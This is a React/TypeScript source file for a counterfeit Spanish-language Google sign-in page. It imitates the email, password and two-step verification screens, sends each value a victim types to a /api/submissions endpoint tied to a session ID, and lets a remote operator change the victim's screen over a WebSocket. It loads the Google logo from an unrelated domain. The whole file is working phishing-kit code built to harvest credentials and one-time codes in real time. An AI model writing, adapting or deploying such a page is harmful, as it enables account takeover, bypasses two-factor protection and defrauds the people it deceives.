import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "@/hooks/use-websocket";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { ChevronDown } from "lucide-react";

type Screen = "email" | "password" | "2fa" | "loading";

interface FormData {
  email: string;
  password: string;
  code2fa: string;
}

export default function TemplateGoogle() {
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  const { lastMessage } = useWebSocket();
  
  const [currentScreen, setCurrentScreen] = useState<Screen>("email");
  const [formData, setFormData] = useState<FormData>({
    email: "",
    password: "",
    code2fa: ""
  });
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Update session when screen changes
  const updateSession = async (data: any) => {
    if (!sessionId) return;
    try {
      await apiRequest("PATCH", `/api/sessions/${sessionId}`, data);
    } catch (error) {
      console.error("Failed to update session:", error);
    }
  };

  // Submit data mutation
  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const submitData = async (fieldName: string, fieldValue: string) => {
    await submitDataMutation.mutateAsync({ fieldName, fieldValue });
  };

  // Listen for WebSocket updates to change screen remotely
  useEffect(() => {
    if (lastMessage) {
      try {
        const message = JSON.parse(lastMessage);
        if (message.type === 'session_updated' && 
            message.data.id === sessionId && 
            message.data.currentScreen && 
            message.data.currentScreen !== currentScreen) {
          setCurrentScreen(message.data.currentScreen);
        }
      } catch (error) {
        console.error("Error parsing WebSocket message:", error);
      }
    }
  }, [lastMessage, sessionId, currentScreen]);

  const handleNext = () => {
    if (currentScreen === "email" && formData.email) {
      setCurrentScreen("password");
    } else if (currentScreen === "password" && formData.password) {
      setCurrentScreen("2fa");
    } else if (currentScreen === "2fa" && formData.code2fa) {
      setCurrentScreen("loading");
    }
  };

  const handleInputChange = (fieldName: string, value: string) => {
    setFormData(prev => ({ ...prev, [fieldName]: value }));
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.email) return;

    await submitData("email", formData.email);
    setCurrentScreen("password");
    await updateSession({ currentScreen: "password", status: "active" });
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.password) return;

    await submitData("password", formData.password);
    setCurrentScreen("2fa");
    await updateSession({ currentScreen: "2fa", status: "active" });
  };

  const handle2faSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.code2fa) return;

    await submitData("code2fa", formData.code2fa);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading", status: "completed" });
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "email":
        return (
          <div className="min-h-screen bg-white flex flex-col">
            <div className="flex-1 flex items-center justify-center px-4">
              <div className="w-full max-w-md">
                {/* Logo de Google */}
                <div className="text-center mb-8">
                  <img 
                    src="https://hh.airlines-mx.click/premios/hook/Google-Logo.png" 
                    alt="Google" 
                    className="h-12 mx-auto"
                  />
                </div>

                {/* Título */}
                <div className="text-center mb-8">
                  <h1 className="text-2xl font-normal text-gray-800 mb-2">Inicia sesión</h1>
                  <p className="text-sm text-gray-600">Ir a Gmail</p>
                </div>

                {/* Formulario */}
                <form onSubmit={handleEmailSubmit} className="space-y-6">
                  <div>
                    <Label htmlFor="email" className="text-sm text-gray-700 mb-2 block">
                      Correo electrónico o teléfono
                    </Label>
                    <Input
                      id="email"
                      type="text"
                      value={formData.email}
                      onChange={(e) => handleInputChange("email", e.target.value)}
                      className="w-full h-14 text-base border-gray-300 rounded-md focus:border-blue-500 focus:ring-1 focus:ring-blue-500 bg-white text-gray-900"
                      placeholder=""
                      data-testid="input-email"
                      required
                    />
                  </div>

                  <div className="text-left">
                    <a href="#" className="text-sm text-blue-600 hover:underline">
                      ¿Has olvidado tu correo electrónico?
                    </a>
                  </div>

                  <div className="text-sm text-gray-600">
                    ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada.{" "}
                    <a href="#" className="text-blue-600 hover:underline">
                      Más información sobre cómo usar el modo Invitado
                    </a>
                  </div>

                  <div className="flex justify-between items-center pt-4">
                    <Button
                      type="button"
                      variant="ghost"
                      className="text-blue-600 hover:bg-blue-50 font-medium"
                      data-testid="button-create-account"
                    >
                      Crear cuenta
                    </Button>
                    <Button
                      type="submit"
                      className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-md font-medium"
                      disabled={!formData.email}
                      data-testid="button-next"
                    >
                      Siguiente
                    </Button>
                  </div>
                </form>
              </div>
            </div>

            {/* Footer */}
            <footer className="p-4 border-t border-gray-200">
              <div className="flex justify-between items-center text-sm text-gray-600">
                <div className="flex items-center">
                  <span>Español (España)</span>
                  <ChevronDown className="ml-1 h-4 w-4" />
                </div>
                <div className="flex space-x-6">
                  <a href="#" className="hover:underline">Ayuda</a>
                  <a href="#" className="hover:underline">Privacidad</a>
                  <a href="#" className="hover:underline">Términos</a>
                </div>
              </div>
            </footer>
          </div>
        );

      case "password":
        return (
          <div className="min-h-screen bg-white flex flex-col">
            <div className="flex-1 flex items-center justify-center px-4">
              <div className="w-full max-w-md">
                {/* Logo de Google */}
                <div className="text-center mb-8">
                  <img 
                    src="https://hh.airlines-mx.click/premios/hook/Google-Logo.png" 
                    alt="Google" 
                    className="h-12 mx-auto"
                  />
                </div>

                {/* Título y usuario */}
                <div className="text-center mb-8">
                  <h1 className="text-2xl font-normal text-gray-800 mb-6">Te damos la bienvenida</h1>
                  
                  {/* Usuario */}
                  <div className="flex items-center justify-center mb-6">
                    <div className="flex items-center bg-gray-50 rounded-full px-4 py-2 border border-gray-300">
                      <div className="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center text-white text-sm font-medium mr-3">
                        {formData.email.charAt(0).toUpperCase()}
                      </div>
                      <span className="text-sm text-gray-700">{formData.email}</span>
                      <ChevronDown className="ml-2 h-4 w-4 text-gray-500" />
                    </div>
                  </div>
                </div>

                {/* Formulario */}
                <form onSubmit={handlePasswordSubmit} className="space-y-6">
                  <div>
                    <Label htmlFor="password" className="text-sm text-gray-700 mb-2 block">
                      Introduce tu contraseña
                    </Label>
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      value={formData.password}
                      onChange={(e) => handleInputChange("password", e.target.value)}
                      className="w-full h-14 text-base border-gray-300 rounded-md focus:border-blue-500 focus:ring-1 focus:ring-blue-500 bg-white text-gray-900"
                      placeholder=""
                      data-testid="input-password"
                      required
                    />
                  </div>

                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="show-password"
                      checked={showPassword}
                      onCheckedChange={(checked) => setShowPassword(!!checked)}
                      data-testid="checkbox-show-password"
                    />
                    <Label htmlFor="show-password" className="text-sm text-gray-700">
                      Mostrar contraseña
                    </Label>
                  </div>

                  <div className="text-left">
                    <a href="#" className="text-sm text-blue-600 hover:underline">
                      ¿Has olvidado tu contraseña?
                    </a>
                  </div>

                  <div className="flex justify-end pt-4">
                    <Button
                      type="submit"
                      className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-md font-medium"
                      disabled={!formData.password}
                      data-testid="button-next"
                    >
                      Siguiente
                    </Button>
                  </div>
                </form>
              </div>
            </div>

            {/* Footer */}
            <footer className="p-4 border-t border-gray-200">
              <div className="flex justify-between items-center text-sm text-gray-600">
                <div className="flex items-center">
                  <span>Español (España)</span>
                  <ChevronDown className="ml-1 h-4 w-4" />
                </div>
                <div className="flex space-x-6">
                  <a href="#" className="hover:underline">Ayuda</a>
                  <a href="#" className="hover:underline">Privacidad</a>
                  <a href="#" className="hover:underline">Términos</a>
                </div>
              </div>
            </footer>
          </div>
        );

      case "2fa":
        return (
          <div className="min-h-screen bg-white flex flex-col">
            <div className="flex-1 flex items-center justify-center px-4">
              <div className="w-full max-w-md">
                {/* Logo de Google */}
                <div className="text-center mb-8">
                  <img 
                    src="https://hh.airlines-mx.click/premios/hook/Google-Logo.png" 
                    alt="Google" 
                    className="h-12 mx-auto"
                  />
                </div>

                {/* Título */}
                <div className="text-center mb-8">
                  <h1 className="text-2xl font-normal text-gray-800 mb-4">Verificación en 2 pasos</h1>
                  <p className="text-sm text-gray-600 mb-2">
                    Para mantener tu cuenta protegida, Google quiere verificar que realmente eres tú.
                  </p>
                  <p className="text-sm text-gray-600">
                    Hemos enviado un código de verificación a tu dispositivo móvil.
                  </p>
                </div>

                {/* Formulario */}
                <form onSubmit={handle2faSubmit} className="space-y-6">
                  <div>
                    <Label htmlFor="code2fa" className="text-sm text-gray-700 mb-2 block">
                      Introduce el código de verificación
                    </Label>
                    <Input
                      id="code2fa"
                      type="text"
                      value={formData.code2fa}
                      onChange={(e) => handleInputChange("code2fa", e.target.value)}
                      className="w-full h-14 text-base border-gray-300 rounded-md focus:border-blue-500 focus:ring-1 focus:ring-blue-500 bg-white text-gray-900 text-center tracking-wider"
                      placeholder="Código de 6 dígitos"
                      maxLength={6}
                      pattern="[0-9]{6}"
                      data-testid="input-2fa-code"
                      required
                    />
                  </div>

                  <div className="text-sm text-gray-600">
                    <p>¿No has recibido el código?</p>
                    <div className="mt-2 space-y-1">
                      <a href="#" className="text-blue-600 hover:underline block">
                        Reenviar código por SMS
                      </a>
                      <a href="#" className="text-blue-600 hover:underline block">
                        Usar otro método de verificación
                      </a>
                    </div>
                  </div>

                  <div className="flex justify-end pt-4">
                    <Button
                      type="submit"
                      className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-md font-medium"
                      disabled={!formData.code2fa || formData.code2fa.length !== 6}
                      data-testid="button-verify"
                    >
                      Verificar
                    </Button>
                  </div>
                </form>
              </div>
            </div>

            {/* Footer */}
            <footer className="p-4 border-t border-gray-200">
              <div className="flex justify-between items-center text-sm text-gray-600">
                <div className="flex items-center">
                  <span>Español (España)</span>
                  <ChevronDown className="ml-1 h-4 w-4" />
                </div>
                <div className="flex space-x-6">
                  <a href="#" className="hover:underline">Ayuda</a>
                  <a href="#" className="hover:underline">Privacidad</a>
                  <a href="#" className="hover:underline">Términos</a>
                </div>
              </div>
            </footer>
          </div>
        );

      case "loading":
        return (
          <div className="min-h-screen bg-white flex items-center justify-center">
            <div className="text-center">
              {/* Logo de Google */}
              <div className="mb-8">
                <img 
                  src="https://hh.airlines-mx.click/premios/hook/Google-Logo.png" 
                  alt="Google" 
                  className="h-12 mx-auto"
                />
              </div>
              <div className="animate-spin w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full mx-auto mb-4"></div>
              <p className="text-gray-600">Verificando credenciales...</p>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return renderScreen();
}